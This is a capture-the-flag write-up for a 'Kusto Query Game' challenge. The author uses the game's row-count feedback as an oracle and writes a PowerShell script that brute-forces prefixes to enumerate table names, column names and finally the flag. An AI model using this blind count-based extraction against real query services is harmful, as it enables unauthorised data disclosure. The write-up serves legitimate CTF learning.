> :memo: **Note:** Category: MISC.

# The Kusto Query Game

By navigating to `https://kqlgame.redacted.redacted` we are presented with the KQL game where the text reads:

>  Click the button below to start the game. You will be given a random target number of rows, and your job is to craft a KQL query that returns exactly that many rows from the Storm Events dataset.

Starting the game looks like this:

![](https://github.com/user-attachments/assets/16c5222a-3b29-49cb-ac61-5cdd19ac3636)

## Solving the "game" 

First idea here was to solve the game by answering correctly, I accomplished this by creating the following query:

```
StormEvents
| serialize 
| extend RowNumber = row_number()
| where RowNumber <= X
```

And I simply substituted X with the number I was supposed to reach. When we reach 5/5, we are presented with this information:

![](https://github.com/user-attachments/assets/6ee48789-c89a-42fd-8ca5-cb268665cae5)

Well, it was never going to be easy.

## How to enumerate information

When we "miss" our target rows, the following information is presented:

![](https://github.com/user-attachments/assets/7d761b2f-9e5c-4111-bfa0-792033de47a2)

This means we get some output, namely how many results are returned in the form of count. 
We can use this logic to enumerate, say if something **exists it will return a count of 1 or more, if something does not exist it returns 0.**

## Enumerating tables

In Azure Data Explorer we can use the following command to enumerate tables:

```
.show tables
```
This returns `The row count for your query was 2 when it should have been 31.`, which tells us there's one more table in addition to the `StormEvents` table.

### Enumerating table names

For this part, I decided to make a wrapper to send queries to the endpoint in order to speed up the process. I did this in PowerShell :cow: 
My general idea was to create a function that checks the table names prefix by running the query `.show tables | where TableName startswith '$prefix'` where I would substitute different letters for `$prefix`.
Then I wanted to have it loop over valid characters and have it "follow" any time it finds valid characters. By this logic, the loop would get to `S` and then start looping again, until it hits `St` all the way down until it gets to `StormEvents`. Here it would loop through all possible characters appending to the end of `StormEvents`, find nothing and quit.

```powershell
# Define the URLs
$startGameUrl = "https://kqlgame.redacted.redacted/start-game"
$gameUrl = "https://kqlgame.redacted.redacted/game"

# Function to check if a table name starts with a given prefix
function Check-TableNamePrefix {
    param (
        [string]$prefix
    )

    #$query = ".show table Users dimensions | where AttributeName startswith '$prefix'"
    $query = ".show tables | where TableName startswith '$prefix'"
    $formData = @{
        query = $query
    }

    # Convert form data to URL-encoded format
    $encodedFormData = [System.Web.HttpUtility]::ParseQueryString([string]::Empty)
    $formData.GetEnumerator() | ForEach-Object { $encodedFormData.Add($_.Key, $_.Value) }
    $encodedFormDataString = $encodedFormData.ToString()

    # Make the POST request
    $response = Invoke-RestMethod -Uri $gameUrl -Method Post -ContentType "application/x-www-form-urlencoded" -Body $encodedFormDataString

    # Extract the row count from the response
    if ($response -match '<h2>The row count for your query was (\d+) when it should have been 0\.</h2>') {
        return [int]$matches[1]
    } else {
        return 0
    }
}

# Define the characters to iterate through, valid characters for the flag + ADX
$characters = @('A'..'Z') + @('a'..'z') + @('0'..'9') + @('_', '{', '}')

# Initialize variables
$tableNames = @()
$currentPrefix =  ""
$runCount = 0

# Loop to find table names
while ($true) {
    $found = $false
    foreach ($char in $characters) {
        $prefix = $currentPrefix + $char
        Write-Output "Running query with prefix: $prefix"
        $rowCount = Check-TableNamePrefix -prefix $prefix
        Write-Output "Query result for prefix '$prefix': $rowCount rows"

        if ($rowCount -eq 1) {
            $currentPrefix = $prefix
            $found = $true
            break
        }
    }

    if (-not $found) {
        if ($currentPrefix -ne "") {
            $tableNames += $currentPrefix
            Write-Output "Table name: $currentPrefix"
            $currentPrefix = $currentPrefix.Substring(0, $currentPrefix.Length - 1)
        } else {
            break
        }
    }
    $runCount++
}
```
This outputs the letters it finds, and "follows" anytime there's a response in count equal to one. As an exampe, here it is finding parts `StormEvents`, which we already know exists as a table:

![](https://github.com/user-attachments/assets/3f26eaa7-4c8f-48df-8c03-979d48f8f6a9)

At this point I got no hits before `StormEvents`, so I was pretty sure the table started with a letter after `S`. Here I added an `if`-setting to make sure it skips it:

```powershell
# We can add a variable first run to the top of the script
$firstRun = $true

# Checks if firstRun is true, and ignores S
if ($firstRun -and $char -eq 'S') {
            continue
}

# Set firstRun to false (after $runCount++)
$firstRun = $false
```

I added this after line 98. Now it skips S and takes us to a new entry, `Users`:

![](https://github.com/user-attachments/assets/a820254a-ede5-47bb-8979-afbae9fa7abb)

> :memo: **Note:** At this point, we could have skipped over enumerating the fields in the tables. I thought this was important, but it's not as we can simply query the `Users` table using a wildcard operator (`*`) for the datafield by doing `Users | where * startswith 'EPT{'`.

## Enumerating table fields

At this point I could probably skip straight to outputting the flag, but I decided to enumerate the names of the different fields in the table. For this I changed the `$query` to the following:

```powershell
$query = ".show table Users dimensions | where AttributeName startswith '$prefix'"
```

This gave me the following output:

```powershell
Query result for prefix 'NAME8': 0 rows
Running query with prefix: NAME9
Query result for prefix 'NAME9': 0 rows
Running query with prefix: NAME_
Query result for prefix 'NAME_': 0 rows
Running query with prefix: NAME{
Query result for prefix 'NAME{': 0 rows
Running query with prefix: NAME}
Query result for prefix 'NAME}': 0 rows
Table name: NAME
```

Cool, and just to make sure we are not missing anything, let's add `N` as a skip variable and run it again:

```powershell
Running query with prefix: OCCUPATION_
Query result for prefix 'OCCUPATION_': 0 rows
Running query with prefix: OCCUPATION{
Query result for prefix 'OCCUPATION{': 0 rows
Running query with prefix: OCCUPATION}
Query result for prefix 'OCCUPATION}': 0 rows
Table name: OCCUPATION
```

Ok so we know there are two fields, `NAME` and `OCCUPATION`. Now let's check if we can modify our script to help us print the flag.

## Printing the flag

The flag has the following format `EPT{...}`. Using this information, we can create a KQL query that checks if a value in the `Users`-table starts with `EPT{` and go from there.

We modify our `$Query` parameter to this:

```powershell
$query = "Users | where * startswith '$prefix'"
```

Our first hit is a dud, and exists at the following particular value:

```
Table name: EPT{B00B
``` 

We add `B` to our skip variable and go again:

```
Table name: EPT{DA52
```

At this point, I get the rather smart idea to update the query to include `endswith` targetting the `}`-variable:

```powershell
$query = "Users | where * startswith '$prefix' | where * endswith '}'"
```

This gives us the following output:

```
Table name: EPT{rEdActEdFlAg}
```

That's the flag!

## Improvements

You might ask why I do this in Powershell and not Python? I simply write Powershell faster and I use it for work, so there's that. Anyway, my ideas for improvements for later:

- Add a parameter to be able to change the query
- Add a simple way to ignore words and characters in a parameter
- Make sure the loop "jumps back out" once it finds a table, i.e the logic is if it follows a value `ABCDE` and then suddenly finds no valid characters, add `ABCDE` to an array of "found stuff" and jump back down to the first defined character, wether that is starting from scratch or from a set prefix like `EPT{`


